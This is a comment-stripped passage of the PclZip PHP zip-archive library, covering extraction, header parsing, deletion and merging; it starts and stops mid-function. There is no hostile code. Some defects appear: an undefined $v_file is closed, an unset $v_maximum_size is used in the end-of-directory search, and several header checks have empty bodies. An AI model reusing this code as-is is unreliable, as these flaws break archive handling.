          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
